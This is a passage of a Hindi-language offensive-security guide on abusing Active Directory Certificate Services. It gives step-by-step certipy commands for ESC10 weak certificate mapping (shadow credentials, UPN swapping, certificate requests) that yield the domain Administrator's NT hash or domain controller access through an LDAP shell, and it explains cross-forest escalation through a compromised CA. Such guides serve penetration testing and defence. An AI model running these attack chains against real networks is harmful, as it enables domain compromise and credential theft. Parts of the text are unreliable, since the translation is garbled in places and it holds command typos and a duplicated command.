प्रकारित प्रमाणपत्र के साथ प्रमाणीकरण का प्रयास अब `Administrator@corp.local` का NT हैश देता है। प्रमाणपत्र के डोमेन विशिष्टीकरण की कमी के कारण आज्ञा में `-domain <domain>` शामिल होना चाहिए:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## दुर्बल प्रमाणपत्र मैपिंग - ESC10

### स्पष्टीकरण

डोमेन कंट्रोलर पर दो रजिस्ट्री कुंजी मान ESC10 द्वारा संदर्भित हैं:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` तहत `CertificateMappingMethods` के लिए डिफ़ॉल्ट मान `0x18` (`0x8 | 0x10`) है, पहले `0x1F` पर सेट किया गया था।
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` तहत `StrongCertificateBindingEnforcement` के लिए डिफ़ॉल्ट सेटिंग `1` है, पहले `0` था।

**मामला 1**

जब `StrongCertificateBindingEnforcement` को `0` के रूप में कॉन्फ़िगर किया जाता है।

**मामला 2**

यदि `CertificateMappingMethods` में `UPN` बिट (`0x4`) शामिल है।

### दुरुपयोग मामला 1

`StrongCertificateBindingEnforcement` को `0` के रूप में कॉन्फ़िगर करने पर, एक खाता A जिसमें `GenericWrite` अनुमतियाँ हैं, किसी भी खाता B को कम्प्रमाइज़ करने के लिए उपयोग किया जा सकता है।

उदाहरण के लिए, `Jane@corp.local` पर `GenericWrite` अनुमतियाँ होने पर, हमलावर `Administrator@corp.local` को कम्प्रमाइज़ करने का लक्ष्य रखता है। प्रक्रिया ESC9 को मिरर करती है, जिसमें किसी भी प्रमाणपत्र टेम्प्लेट का उपयोग किया जा सकता है।

शुरू में, `Jane` की हैश को शैडो क्रेडेंशियल का उपयोग करके प्राप्त किया जाता है, `GenericWrite` का शोषण करते हुए।
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
इसके बाद, `Jane` का `userPrincipalName` `Administrator` में बदल दिया जाता है, `@corp.local` भाग को जानबूझकर छोड़ दिया जाता है ताकि कोई प्रतिबंध उल्लंघन न हो।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
निम्नलिखित के अनुसार, एक प्रमाणपत्र जो क्लाइंट प्रमाणीकरण सक्षम करता है, `Jane` के रूप में एक अनुरोध किया जाता है, डिफ़ॉल्ट `User` टेम्पलेट का उपयोग करके।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` का `userPrincipalName` फिर से उसके मूल, `Jane@corp.local` पर वापस किया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
जिस प्राप्त प्रमाणपत्र के साथ प्रमाणीकरण किया जाएगा, उससे `Administrator@corp.local` का NT हैश प्राप्त होगा, प्रमाणपत्र में डोमेन विवरणों की अनुपस्थिति के कारण कमांड में डोमेन की विशेषीकरण की आवश्यकता होगी।
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### दुरुपयोग मामला 2

`CertificateMappingMethods` में `UPN` बिट फ्लैग (`0x4`) शामिल होने के साथ, एक खाता A जिसमें `GenericWrite` अनुमतियाँ हैं, किसी भी खाता B को कंप्रोमाइज कर सकता है जिसमें `userPrincipalName` गुण नहीं है, जिसमें मशीन खाते और निर्मित डोमेन प्रशासक `Administrator` शामिल हैं।

यहाँ, लक्ष्य `DC$@corp.local` को कंप्रोमाइज करना है, `Jane` के हैश को शैडो क्रेडेंशियल के माध्यम से प्राप्त करके, `GenericWrite` का लाभ उठाते हुए।
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` का `userPrincipalName` फिर `DC$@corp.local` पर सेट किया जाता ह।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
एक प्रमाणपत्र क्लाइंट प्रमाणीकरण के लिए `Jane` के रूप में `User` टेम्पलेट का अनुरोध किया जाता है।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` का `userPrincipalName` इस प्रक्रिया के बाद अपने मूल स्थिति में वापस लौट जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
क्रमांकीकरण के लिए Schannel के माध्यम से प्रमाणीकरण करने के लिए, Certipy का `-ldap-shell` विकल्प प्रयोग किया जाता है, जिसमें प्रमाणीकरण सफलता को `u:CORP\DC$` के रूप में दर्शाया जाता है।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
प्रमुख नियंत्रक को क्षति पहुंचाने की संभावना वाले संकटित अधिकार आधारित अधिकार देने (RBCD) हमलों को सक्षम करने जैसे आदेशों के माध्यम से LDAP शैली के माध्यम से `set_rbcd` जैसे कमांड।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
## डोमेन उन्नति

यह कमजोरी किसी भी उपयोगकर्ता खाते तक फैलती है जिसमें `userPrincipalName` अभाव है या जिसमें यह `sAMAccountName` से मेल नहीं खाता, डिफ़ॉल्ट `Administrator@corp.local` को उच्च LDAP विशेषाधिकारों और एक `userPrincipalName` के अभाव के कारण मुख्य लक्ष्य बनाता है।


## प्रमाणपत्रों के माध्यम से वन उन्नति का उल्लेख पैसिव वॉयस में समझाया गया

### कम्प्रोमाइज्ड सीए द्वारा वन विश्वास ट्रस्ट का टूटना

**क्रॉस-वन नामांकन** के लिए विन्यास को अनुकूल बनाया जाता है। संसाधक द्वारा संसाधन वन से **मूल सीए प्रमाणपत्र** को खाता वन में प्रकाशित किया जाता है, और संसाधन वन से उद्यम सीए प्रमाणपत्र को प्रत्येक खाता वन में `NTAuthCertificates` और AIA कंटेनर में जोड़ा जाता है। स्पष्ट करने के लिए, यह व्यवस्था संसाधन वन में सीए को सभी अन्य वनों पर पूर्ण नियंत्रण प्रदान करती है जिनका प्रबंधन पीकेआई करता है। यदि यह सीए हमलावरों द्वारा कम्प्रोमाइज़ हो जाए, तो सभी उपयोगकर्ताओं के प्रमाणपत्रों को उनके द्वारा जाली बनाया जा सकता है, इसके फलस्वरूप वन की सुरक्षा सीमा टूट जाती है।

### विदेशी प्रिंसिपल्स को नामांकन विशेषाधिकार प्रदान किए गए

मल्टी-वन परिवेशों में, सतर्कता की आवश्यकता है जो उद्यम सीए द्वारा प्रमाणपत्र नमूने प्रकाशित करते हैं जो **प्रमाणित उपयोगकर्ता या विदेशी प्रिंसिपल्स** (उपयोगकर्ता/समूह जो उद्यम सीए के वन से बाहर हैं) **नामांकन और संपादन अधिकार** देते हैं।\
विश्वास के एक दुआरावार से प्रमाणीकरण के बाद, एडी द्वारा उपयोगकर्ता के टोकन में **प्रमाणित उपयोगकर्ता SID** जोड़ दिया जाता है। इस प्रकार, यदि किसी डोमेन में एक उद्यम सीए होता है जिसमें एक नामांकन नमूना है जो **प्रमाणित उपयोगकर्ता नामांकन अधिकार** देता है, तो एक नामांकन नमूना संभावित रूप से एक उपयोगकर्ता द्वारा **एक विभिन्न वन से नामांकित किया जा सकता है**। उसी तरह, यदि एक नामांकन नमूने द्वारा विदेशी प्रिंसिपल को स्पष्ट रूप से नामांकन अधिकार प्रदान किए जाते हैं, तो एक **वन से एक नामांकन नामांकन संबंध स्थापित** हो जाता है, जिससे एक वन से एक प्रिंसिपल को **एक नामांकन नमूना में नामांकित करने की संभावना होती है**।

दोनों स्थितियाँ एक वन से दूसरे वन में हमले की सतह में वृद्धि करती हैं। प्रमाणपत्र नमूने की सेटिंग्स का दुरुपयोग किसी हमलावर द्वारा एक विदेशी डोमेन में अतिरिक्त विशेषाधिकार प्राप्त करने के लिए किया जा सकता है।
